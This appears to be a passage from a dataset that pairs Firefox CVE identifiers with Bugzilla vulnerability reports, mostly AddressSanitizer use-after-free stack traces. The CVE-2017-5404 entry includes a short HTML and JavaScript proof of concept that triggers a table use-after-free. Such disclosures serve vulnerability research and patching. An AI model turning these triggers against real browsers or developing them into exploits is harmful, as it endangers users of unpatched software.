0x7fd00ff60214 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7426:7 #17 0x7fd00ff67a9f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7323:13 #18 0x7fd008a838e0 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1256:3 #19 0x7fd008a82878 in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:841:5 #20 0x7fd008a7f5d6 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:731:9 #21 0x7fd008a816d4 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:613:5 #22 0x7fd008a8228c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:469:14 #23 0x7fd00726969b in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:633:18 #24 0x7fd009ad1ffb in nsDocument::DoUnblockOnload() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8832:7 #25 0x7fd009ad1b9b in nsDocument::UnblockOnload(bool) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8758:9 #26 0x7fd009aa7cfc in nsDocument::DispatchContentLoadedEvents() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:5280:3 #27 0x7fd009b821a2 in applyImpl<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:855:12 #28 0x7fd009b821a2 in apply<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:861 #29 0x7fd009b821a2 in mozilla::detail::RunnableMethodImpl<nsDocument*, void (nsDocument::*)(), true, false>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:890 #30 0x7fd0070809d2 in mozilla::ValidatingDispatcher::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/Dispatcher.cpp:242:21 #31 0x7fd0070b4f59 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #32 0x7fd0070b1850 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #33 0x7fd007ec6acf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #34 0x7fd007e37c38 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #35 0x7fd007e37c38 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #36 0x7fd007e37c38 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 previously allocated by thread T0 (Web Content) here: #0 0x4b2d5b in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x7fd01fa34a24 in PL_ArenaAllocate /home/worker/workspace/build/src/nsprpub/lib/ds/plarena.c:127:27 #2 0x7fd00d936731 in nsPresArena::Allocate(unsigned int, unsigned long) /home/worker/workspace/build/src/layout/base/nsPresArena.cpp:165:3 #3 0x7fd00d84ab7e in AllocateByObjectID /home/worker/workspace/build/src/layout/base/nsPresArena.h:65:12 #4 0x7fd00d84ab7e in AllocateByObjectID /home/worker/workspace/build/src/layout/base/nsIPresShell.h:239 #5 0x7fd00d84ab7e in operator new /home/worker/workspace/build/src/layout/style/nsStyleStruct.h:2803 #6 0x7fd00d84ab7e in nsRuleNode::ComputeDisplayData(void*, nsRuleData const*, nsStyleContext*, nsRuleNode*, nsRuleNode::RuleDetail, mozilla::RuleNodeCacheConditions) /home/worker/workspace/build/src/layout/style/nsRuleNode.cpp:5544 #7 0x7fd00d8292f1 in nsRuleNode::WalkRuleTree(nsStyleStructID, nsStyleContext*) /home/worker/workspace/build/src/layout/style/nsRuleNode.cpp:2638:10 #8 0x7fd00905afd7 in nsStyleDisplay const* nsRuleNode::GetStyleDisplay<true>(nsStyleContext*) /home/worker/workspace/build/src/obj-firefox/dist/include/nsStyleStructList.h:98:1 #9 0x7fd00d898413 in DoGetStyleDisplay<true> /home/worker/workspace/build/src/obj-firefox/layout/style/nsStyleStructList.h:98:1 #10 0x7fd00d898413 in StyleDisplay /home/worker/workspace/build/src/obj-firefox/layout/style/nsStyleStructList.h:98 #11 0x7fd00d898413 in nsStyleContext::SetStyleBits() /home/worker/workspace/build/src/layout/style/nsStyleContext.cpp:716 #12 0x7fd00d897cc6 in FinishConstruction /home/worker/workspace/build/src/layout/style/nsStyleContext.cpp:171:3 #13 0x7fd00d897cc6 in nsStyleContext::nsStyleContext(nsStyleContext*, nsIAtom*, mozilla::CSSPseudoElementType, already_AddRefed<nsRuleNode>, bool) /home/worker/workspace/build/src/layout/style/nsStyleContext.cpp:129 #14 0x7fd00d8a6989 in NS_NewStyleContext(nsStyleContext*, nsIAtom*, mozilla::CSSPseudoElementType, nsRuleNode*, bool) /home/worker/workspace/build/src/layout/style/nsStyleContext.cpp:1368:5 #15 0x7fd00d8c88ff in nsStyleSet::GetContext(nsStyleContext*, nsRuleNode*, nsRuleNode*, nsIAtom*, mozilla::CSSPseudoElementType, mozilla::dom::Element*, unsigned int) /home/worker/workspace/build/src/layout/style/nsStyleSet.cpp:943:14 #16 0x7fd00d8cd849 in nsStyleSet::ResolveStyleForInternal(mozilla::dom::Element*, nsStyleContext*, TreeMatchContext&, nsStyleSet::AnimationFlag) /home/worker/workspace/build/src/layout/style/nsStyleSet.cpp:1393:10 #17 0x7fd00d8cd300 in nsStyleSet::ResolveStyleFor(mozilla::dom::Element*, nsStyleContext*, TreeMatchContext&) /home/worker/workspace/build/src/layout/style/nsStyleSet.cpp:1403:10 #18 0x7fd00da5ec67 in ResolveStyleFor /home/worker/workspace/build/src/layout/style/nsStyleSet.h:135:12 #19 0x7fd00da5ec67 in ResolveStyleFor /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/StyleSetHandleInlines.h:94 #20 0x7fd00da5ec67 in nsCSSFrameConstructor::ResolveStyleContext(nsStyleContext*, nsIContent*, nsFrameConstructorState*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:5037 #21 0x7fd00da61ed0 in ResolveStyleContext /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:5006:10 #22 0x7fd00da61ed0 in ResolveStyleContext /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:5022 #23 0x7fd00da61ed0 in nsCSSFrameConstructor::AddFrameConstructionItems(nsFrameConstructorState&, nsIContent*, bool, nsCSSFrameConstructor::InsertionPoint const&, nsCSSFrameConstructor::FrameConstructionItemList&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:5654 #24 0x7fd00da458e6 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10873:9 #25 0x7fd00da59c97 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4061:9 #26 0x7fd00da64986 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6189:3 #27 0x7fd00da4ff55 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10685:5 #28 0x7fd00da4ff55 in nsCSSFrameConstructor::BeginBuildingScrollFrame(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, nsIAtom*, bool, nsContainerFrame*&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4572 #29 0x7fd00da4ca7b in nsCSSFrameConstructor::SetUpDocElementContainingBlock(nsIContent*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:2904:25 #30 0x7fd00da4903c in nsCSSFrameConstructor::ConstructDocElementFrame(mozilla::dom::Element*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:2416:3 #31 0x7fd00da6d959 in nsCSSFrameConstructor::ContentRangeInserted(nsIContent*, nsIContent*, nsIContent*, nsILayoutHistoryState*, bool) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7773:7 #32 0x7fd00d9b5282 in mozilla::PresShell::Initialize(int, int) /home/worker/workspace/build/src/layout/base/PresShell.cpp:1810:7 #33 0x7fd009a0d161 in nsContentSink::StartLayout(bool) /home/worker/workspace/build/src/dom/base/nsContentSink.cpp:1237:19 #34 0x7fd008c5c446 in nsHtml5TreeOpExecutor::StartLayout() /home/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:622:3 #35 0x7fd008c686d9 in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) /home/worker/workspace/build/src/parser/html/nsHtml5TreeOperation.cpp:998:7 #36 0x7fd008c59bd1 in nsHtml5TreeOpExecutor::RunFlushLoop() /home/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:457:21 #37 0x7fd008c5e94b in nsHtml5ExecutorFlusher::Run() /home/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:128:9 #38 0x7fd0070809d2 in mozilla::ValidatingDispatcher::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/Dispatcher.cpp:242:21 #39 0x7fd0070b4f59 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #40 0x7fd0070b1850 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/layout/style/nsStyleContext.cpp:343:10 in RemoveChild Shadow bytes around the buggy address: 0x0c4a800739d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a800739e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a800739f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80073a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80073a10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c4a80073a20: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd 0x0c4a80073a30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80073a40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80073a50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80073a60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80073a70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==24376==ABORTING"
      }
    ],
    "CVE-2017-5404": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1340138",
        "title": "table use-after-free",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Steps to reproduce: There is a use-after-free security vulnerability in Firefox. The vulnerability was confirmed on the nightly ASan build. Please note: This bug is subject to a 90 day disclosure deadline. If 90 days elapse without a broadly available patch, then the bug report will automatically become visible to the public. With any fix, please give credit for identifying the vulnerability to Ivan Fratric of Google Project Zero. PoC and ASan log can be found below. Notes for reproducing: - PoC uses domFuzzLite3 extension (https://www.squarefree.com/extensions/domFuzzLite3.xpi) in order to trigger the garbage collecor - After the PoC is opened, it takes about 10 seconds for the crash to occur PoC: ================================================================= <style> body { display: table } </style> <script> function freememory() { try { fuzzPriv.forceGC(); } catch(err) { alert('Please install domFuzzLite3'); } } function go() { var s = document.getSelection(); window.find(\"1\",true,false,true,false); s.modify(\"extend\",\"forward\",\"line\"); document.body.append(document.createElement(\"table\")); freememory() } </script> <body onload=go()> <table> <th>u~Z1Cqn`aA}SOkre=]{</th> </table> <progress></progress> ================================================================= ASan log: ================================================================= ==119582==ERROR: AddressSanitizer: heap-use-after-free on address 0x60b000214ce8 at pc 0x7f46d6781c12 bp 0x7ffdc29fc1f0 sp 0x7ffdc29fc1e8 READ of size 8 at 0x60b000214ce8 thread T0 #0 0x7f46d6781c11 in operator! /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:308:36 #1 0x7f46d6781c11 in IsInSelection /home/worker/workspace/build/src/dom/base/nsRange.h:120 #2 0x7f46d6781c11 in nsRange::IsNodeSelected(nsINode*, unsigned int, unsigned int) /home/worker/workspace/build/src/dom/base/nsRange.cpp:202 #3 0x7f46da800fd3 in nsIFrame::IsSelected() const /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:10107:5 #4 0x7f46daaa29f6 in nsTableCellFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableCellFrame.cpp:539:11 #5 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #6 0x7f46daab9bce in nsTableFrame::GenericTraversal(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1212:5 #7 0x7f46daaba703 in nsTableFrame::DisplayGenericTablePart(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&, nsDisplayTableItem*, void (*)(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&)) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1267:3 #8 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #9 0x7f46dab10731 in DisplayRows(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableRowGroupFrame.cpp:231:5 #10 0x7f46daaba703 in nsTableFrame::DisplayGenericTablePart(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&, nsDisplayTableItem*, void (*)(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&)) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1267:3 #11 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #12 0x7f46daab9bce in nsTableFrame::GenericTraversal(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1212:5 #13 0x7f46daaba703 in nsTableFrame::DisplayGenericTablePart(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&, nsDisplayTableItem*, void (*)(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&)) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1267:3 #14 0x7f46daabb382 in nsTableFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1373:3 #15 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #16 0x7f46dab24b16 in BuildDisplayListForInnerTable /home/worker/workspace/build/src/layout/tables/nsTableWrapperFrame.cpp:207:5 #17 0x7f46dab24b16 in nsTableWrapperFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableWrapperFrame.cpp:180 #18 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #19 0x7f46da7912d2 in DisplayLine(nsDisplayListBuilder*, nsRect const&, nsRect const&, nsLineList_iterator&, int, int&, nsDisplayListSet const&, nsBlockFrame*, mozilla::css::TextOverflow*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:6585:5 #20 0x7f46da7890ce in nsBlockFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:6677:7 #21 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #22 0x7f46da7b22f2 in nsCanvasFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:558:5 #23 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #24 0x7f46da87ebf2 in mozilla::ScrollFrameHelper::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:3497:7 #25 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #26 0x7f46da735b0a in mozilla::ViewportFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:63:5 #27 0x7f46da80417b in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsRect const&, nsDisplayList*) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2381:5 #28 0x7f46da990123 in nsSubDocumentFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:471:7 #29 0x7f46da80417b in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsRect const&, nsDisplayList*) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2381:5 #30 0x7f46da78d228 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2910:5 #31 0x7f46dac92672 in nsStackFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsStackFrame.cpp:59:5 #32 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #33 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #34 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5 #35 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #36 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #37 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5 #38 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #39 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #40 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5 #41 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #42 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #43 0x7f46dac0f946 in nsDeckFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsDeckFrame.cpp:199:3 #44 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #45 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #46 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5 #47 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #48 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #49 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5 #50 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #51 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #52 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5 #53 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #54 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #55 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5 #56 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #57 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #58 0x7f46dac0f946 in nsDeckFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsDeckFrame.cpp:199:3 #59 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #60 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #61 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5 #62 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #63 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #64 0x7f46dac0f946 in nsDeckFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsDeckFrame.cpp:199:3 #65 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #66 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #67 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5 #68 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3 #69 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #70 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5 #71 0x7f46dac64b7e in nsRootBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsRootBoxFrame.cpp:195:3 #72 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7 #73 0x7f46da735b0a in mozilla::ViewportFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:63:5 #74 0x7f46da80417b in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsRect const&, nsDisplayList*) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2381:5 #75 0x7f46da6623a6 in 